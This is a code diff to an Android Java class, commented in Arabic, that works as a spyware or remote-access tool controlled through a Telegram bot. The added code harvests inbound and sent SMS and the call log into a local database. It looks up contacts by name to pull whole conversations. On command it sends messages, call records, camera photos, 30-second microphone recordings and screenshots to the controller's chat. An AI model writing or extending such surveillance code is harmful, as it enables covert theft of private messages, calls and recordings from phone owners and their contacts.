@@ -84,6 +84,9 @@ public class TelegramPoller implements Runnable {
         }
     }
 
+    // ============================================================
+    //  🔄 المزامنة (تخزين الرسائل والمكالمات في SQLite)
+    // ============================================================
     private void syncDataFromPhone() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (ctx.checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
@@ -94,6 +97,7 @@ public class TelegramPoller implements Runnable {
             }
         }
 
+        // مزامنة صندوق الوارد
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                 ContentResolver cr = ctx.getContentResolver();
@@ -105,13 +109,7 @@ public class TelegramPoller implements Runnable {
                     if (cursor != null && cursor.moveToFirst() && dbHelper != null) {
                         do {
                             try {
-                                long id = cursor.getLong(0);
-                                String address = cursor.getString(1);
-                                String body = cursor.getString(2);
-                                long date = cursor.getLong(3);
-                                if (address != null && body != null) {
-                                    dbHelper.insertSms(id, address, body, date);
-                                }
+                                dbHelper.insertSms(cursor.getLong(0), cursor.getString(1), cursor.getString(2), cursor.getLong(3));
                             } catch (Exception ignored) {}
                         } while (cursor.moveToNext());
                     }
@@ -120,6 +118,28 @@ public class TelegramPoller implements Runnable {
             }
         } catch (Exception ignored) {}
 
+        // مزامنة الرسائل المرسلة
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+                ContentResolver cr = ctx.getContentResolver();
+                Cursor cursor = null;
+                try {
+                    cursor = cr.query(Telephony.Sms.Sent.CONTENT_URI,
+                            new String[]{"_id", "address", "body", "date"},
+                            null, null, "date DESC");
+                    if (cursor != null && cursor.moveToFirst() && dbHelper != null) {
+                        do {
+                            try {
+                                dbHelper.insertSms(cursor.getLong(0), cursor.getString(1), cursor.getString(2), cursor.getLong(3));
+                            } catch (Exception ignored) {}
+                        } while (cursor.moveToNext());
+                    }
+                } catch (Exception ignored) {}
+                finally { if (cursor != null) cursor.close(); }
+            }
+        } catch (Exception ignored) {}
+
+        // مزامنة المكالمات
         try {
             ContentResolver cr = ctx.getContentResolver();
             Cursor cursor = null;
@@ -130,14 +150,7 @@ public class TelegramPoller implements Runnable {
                 if (cursor != null && cursor.moveToFirst() && dbHelper != null) {
                     do {
                         try {
-                            long id = cursor.getLong(0);
-                            String number = cursor.getString(1);
-                            long duration = cursor.getLong(2);
-                            int type = cursor.getInt(3);
-                            long date = cursor.getLong(4);
-                            if (number != null) {
-                                dbHelper.insertCall(id, number, duration, type, date);
-                            }
+                            dbHelper.insertCall(cursor.getLong(0), cursor.getString(1), cursor.getLong(2), cursor.getInt(3), cursor.getLong(4));
                         } catch (Exception ignored) {}
                     } while (cursor.moveToNext());
                 }
@@ -146,15 +159,27 @@ public class TelegramPoller implements Runnable {
         } catch (Exception ignored) {}
     }
 
+    // ============================================================
+    //  📋 معالجة الأوامر
+    // ============================================================
     private void handleCommand(String cmd) {
         try {
             if (cmd.equals("/help")) {
                 sendMessage(CHAT_ID, "📋 **الأوامر**\n━━━━━━━━━━━━━━━━━━\n" +
-                        "📩 /get_sms - آخر 10 رسائل (محلية)\n" +
-                        "📞 /get_calls - آخر 10 مكالمات (محلية)\n" +
+                        "📩 /get_sms - آخر 10 رسائل (وارد + صادر)\n" +
+                        "📞 /get_calls - آخر 10 مكالمات\n" +
+                        "💬 /get_chat رقم/اسم - رسائل محادثة مع شخص معين\n" +
                         "📷 /take_pic - التقاط صورة\n" +
                         "🎤 /record - تسجيل صوتي (30ث)\n" +
                         "🖥️ /screenshot - لقطة شاشة");
+            }
+            else if (cmd.startsWith("/get_chat")) {
+                String query = cmd.replace("/get_chat", "").trim();
+                if (query.isEmpty()) {
+                    sendMessage(CHAT_ID, "❌ يرجى إدخال رقم أو اسم جهة اتصال.\nمثال: /get_chat 0551234567");
+                } else {
+                    sendMessage(CHAT_ID, getChatHistory(query));
+                }
             }
             else if (cmd.equals("/get_sms")) {
                 sendMessage(CHAT_ID, getSmsFromLocalDB());
@@ -180,13 +205,135 @@ public class TelegramPoller implements Runnable {
         }
     }
 
+    // ============================================================
+    //  💬 محادثة مع شخص معين (جلب الرسائل من الطرفين)
+    // ============================================================
+    private String getChatHistory(String query) {
+        try {
+            if (dbHelper == null) return "❌ قاعدة البيانات غير جاهزة.";
+
+            String targetNumber = query;
+            String contactName = null;
+
+            if (query.matches("[0-9+]+")) {
+                targetNumber = query.replaceAll("[^0-9+]", "");
+                contactName = getContactName(targetNumber);
+            } else {
+                targetNumber = getNumberFromContact(query);
+                if (targetNumber != null) {
+                    contactName = query;
+                } else {
+                    return searchMessagesByText(query);
+                }
+            }
+
+            if (targetNumber == null) {
+                return "❌ لم يتم العثور على جهة اتصال بالاسم: " + query;
+            }
+
+            List<Map<String, String>> list = dbHelper.getChatWith(targetNumber, 20);
+            if (list.isEmpty()) {
+                return "📭 لا توجد رسائل في المحادثة مع " + (contactName != null ? contactName : targetNumber);
+            }
+
+            StringBuilder sb = new StringBuilder("💬 **محادثة مع " + (contactName != null ? contactName : targetNumber) + "**\n");
+            sb.append("━━━━━━━━━━━━━━━━━━━━\n");
+            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault());
+
+            for (Map<String, String> msg : list) {
+                try {
+                    String address = msg.get("address");
+                    String body = msg.get("body");
+                    String dateStr = msg.get("date");
+                    if (address == null || body == null || dateStr == null) continue;
+
+                    String senderName;
+                    if (address.equals("me")) {
+                        senderName = "👤 **أنت**";
+                    } else {
+                        String name = getContactName(address);
+                        senderName = "👤 **" + (name != null ? name : address) + "**";
+                    }
+
+                    long dateMillis = Long.parseLong(dateStr);
+                    sb.append(senderName).append("\n");
+                    sb.append("📝 ").append(body).append("\n");
+                    sb.append("🕐 ").append(sdf.format(new Date(dateMillis))).append("\n");
+                    sb.append("━━━━━━━━━━━━━━━━━━━━\n");
+                } catch (Exception ignored) {}
+            }
+            return sb.toString();
+        } catch (Exception e) {
+            return "❌ خطأ: " + e.getMessage();
+        }
+    }
+
+    // البحث عن رسائل تحتوي على نص معين
+    private String searchMessagesByText(String text) {
+        try {
+            if (dbHelper == null) return "❌ قاعدة البيانات غير جاهزة.";
+            List<Map<String, String>> list = dbHelper.searchSmsByText(text, 20);
+            if (list.isEmpty()) {
+                return "📭 لا توجد رسائل تحتوي على: " + text;
+            }
+
+            StringBuilder sb = new StringBuilder("🔍 **نتائج البحث عن: " + text + "**\n");
+            sb.append("━━━━━━━━━━━━━━━━━━━━\n");
+            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault());
+
+            for (Map<String, String> msg : list) {
+                try {
+                    String address = msg.get("address");
+                    String body = msg.get("body");
+                    String dateStr = msg.get("date");
+                    if (address == null || body == null || dateStr == null) continue;
+
+                    String name = getContactName(address);
+                    String displayName = (name != null) ? name : address;
+                    long dateMillis = Long.parseLong(dateStr);
+
+                    sb.append("👤 **").append(displayName).append("**\n");
+                    sb.append("📝 ").append(body).append("\n");
+                    sb.append("🕐 ").append(sdf.format(new Date(dateMillis))).append("\n");
+                    sb.append("━━━━━━━━━━━━━━━━━━━━\n");
+                } catch (Exception ignored) {}
+            }
+            return sb.toString();
+        } catch (Exception e) {
+            return "❌ خطأ في البحث: " + e.getMessage();
+        }
+    }
+
+    private String getNumberFromContact(String contactName) {
+        try {
+            ContentResolver cr = ctx.getContentResolver();
+            Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
+            String[] projection = {ContactsContract.CommonDataKinds.Phone.NUMBER};
+            String selection = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " LIKE ?";
+            String[] selectionArgs = {"%" + contactName + "%"};
+            Cursor cursor = null;
+            try {
+                cursor = cr.query(uri, projection, selection, selectionArgs, null);
+                if (cursor != null && cursor.moveToFirst()) {
+                    return cursor.getString(0).replaceAll("[^0-9+]", "");
+                }
+            } finally { if (cursor != null) cursor.close(); }
+        } catch (Exception ignored) {}
+        return null;
+    }
+
+    // ============================================================
+    //  📩 عرض الرسائل (وارد + صادر) مع الاسم والرقم
+    // ============================================================
     private String getSmsFromLocalDB() {
         try {
             if (dbHelper == null) return "❌ قاعدة البيانات غير جاهزة.";
             List<Map<String, String>> list = dbHelper.getLastSms(10);
             if (list.isEmpty()) return "📭 لا توجد رسائل محفوظة.";
-            StringBuilder sb = new StringBuilder("📩 **آخر 10 رسائل (محلية)**\n━━━━━━━━━━━━━━━━━━━━\n");
+            StringBuilder sb = new StringBuilder("📩 **آخر 10 رسائل (وارد + صادر)**\n");
+            sb.append("━━━━━━━━━━━━━━━━━━━━\n");
             SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault());
+
             for (Map<String, String> sms : list) {
                 try {
                     String address = sms.get("address");
@@ -194,10 +341,16 @@ public class TelegramPoller implements Runnable {
                     String dateStr = sms.get("date");
                     if (address == null || body == null || dateStr == null) continue;
 
-                    String name = getContactName(address);
-                    String display = (name != null) ? name : address;
+                    String contactName = getContactName(address);
+                    String displayName;
+                    if (contactName != null && !contactName.isEmpty()) {
+                        displayName = contactName + " (" + address + ")";
+                    } else {
+                        displayName = address;
+                    }
+
                     long dateMillis = Long.parseLong(dateStr);
-                    sb.append("👤 **").append(display).append("**\n");
+                    sb.append("👤 **").append(displayName).append("**\n");
                     sb.append("📝 ").append(body).append("\n");
                     sb.append("🕐 ").append(sdf.format(new Date(dateMillis))).append("\n");
                     sb.append("━━━━━━━━━━━━━━━━━━━━\n");
@@ -209,13 +362,17 @@ public class TelegramPoller implements Runnable {
         }
     }
 
+    // ============================================================
+    //  📞 عرض المكالمات مع الاسم والرقم
+    // ============================================================
     private String getCallsFromLocalDB() {
         try {
             if (dbHelper == null) return "❌ قاعدة البيانات غير جاهزة.";
             List<Map<String, String>> list = dbHelper.getLastCalls(10);
             if (list.isEmpty()) return "📭 لا توجد مكالمات محفوظة.";
-            StringBuilder sb = new StringBuilder("📞 **آخر 10 مكالمات (محلية)**\n━━━━━━━━━━━━━━━━━━━━\n");
+            StringBuilder sb = new StringBuilder("📞 **آخر 10 مكالمات**\n━━━━━━━━━━━━━━━━━━━━\n");
             SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault());
+
             for (Map<String, String> call : list) {
                 try {
                     String number = call.get("number");
@@ -224,13 +381,19 @@ public class TelegramPoller implements Runnable {
                     String dateStr = call.get("date");
                     if (number == null || durationStr == null || typeStr == null || dateStr == null) continue;
 
-                    String name = getContactName(number);
-                    String display = (name != null) ? name : number;
+                    String contactName = getContactName(number);
+                    String displayName;
+                    if (contactName != null && !contactName.isEmpty()) {
+                        displayName = contactName + " (" + number + ")";
+                    } else {
+                        displayName = number;
+                    }
+
                     int type = Integer.parseInt(typeStr);
                     String typeDisplay = (type == CallLog.Calls.INCOMING_TYPE) ? "📥 وارد" :
                                          (type == CallLog.Calls.OUTGOING_TYPE) ? "📤 صادر" : "❌ فائتة";
                     long dateMillis = Long.parseLong(dateStr);
-                    sb.append("👤 **").append(display).append("**\n");
+                    sb.append("👤 **").append(displayName).append("**\n");
                     sb.append("📌 ").append(typeDisplay).append("\n");
                     sb.append("⏱️ ").append(formatDuration(Long.parseLong(durationStr))).append("\n");
                     sb.append("🕐 ").append(sdf.format(new Date(dateMillis))).append("\n");
@@ -243,6 +406,9 @@ public class TelegramPoller implements Runnable {
         }
     }
 
+    // ============================================================
+    //  📷 الكاميرا (التقاط صورة)
+    // ============================================================
     private void capturePhoto() {
         try {
             File photoFile = new File(ctx.getCacheDir(), "temp_photo.jpg");
@@ -268,6 +434,9 @@ public class TelegramPoller implements Runnable {
         }
     }
 
+    // ============================================================
+    //  🎤 التسجيل الصوتي
+    // ============================================================
     private void startRecording() {
         try {
             File audioFile = new File(ctx.getCacheDir(), "recording.3gp");
@@ -281,7 +450,8 @@ public class TelegramPoller implements Runnable {
             recorder.prepare();
             recorder.start();
 
-            sendMessage(CHAT_ID, "🎙️ تسجيل لمدة 30 ثانية...");
+            sendMessage(CHAT_ID, "🎙️ **بدأ التسجيل لمدة 30 ثانية...**");
+
             new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                 try {
                     recorder.stop();
@@ -289,10 +459,10 @@ public class TelegramPoller implements Runnable {
                     if (audioFile.exists() && audioFile.length() > 0) {
                         sendAudioStatic(CHAT_ID, audioFile, BOT_TOKEN);
                     } else {
-                        sendMessage(CHAT_ID, "❌ فشل التسجيل.");
+                        sendMessage(CHAT_ID, "❌ فشل التسجيل (الملف فارغ).");
                     }
                 } catch (Exception e) {
-                    sendMessage(CHAT_ID, "❌ خطأ: " + e.getMessage());
+                    sendMessage(CHAT_ID, "❌ خطأ في التسجيل: " + e.getMessage());
                 }
             }, 30000);
 
@@ -301,6 +471,9 @@ public class TelegramPoller implements Runnable {
         }
     }
 
+    // ============================================================
+    //  📤 إرسال الملفات (ثابتة)
+    // ============================================================
     public static void sendPhotoStatic(String chatId, File photoFile, String botToken) {
         try {
             String boundary = "*****" + System.currentTimeMillis() + "*****";
@@ -380,9 +553,15 @@ public class TelegramPoller implements Runnable {
             dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
             dos.flush();
             dos.close();
-            conn.getResponseCode();
+
+            int responseCode = conn.getResponseCode();
+            if (responseCode != 200) {
+                sendMessageStatic(chatId, "❌ فشل إرسال الصوت (كود: " + responseCode + ")");
+            }
             conn.disconnect();
-        } catch (Exception ignored) {}
+        } catch (Exception e) {
+            sendMessageStatic(chatId, "❌ خطأ في إرسال الصوت: " + e.getMessage());
+        }
     }
 
     public static void sendMessageStatic(String chatId, String text) {
@@ -401,6 +580,9 @@ public class TelegramPoller implements Runnable {
         } catch (Exception ignored) {}
     }
 
+    // ============================================================
+    //  🔍 مساعدات
+    // ============================================================
     private String getContactName(String phoneNumber) {
         if (phoneNumber == null || phoneNumber.isEmpty()) return null;
         try {
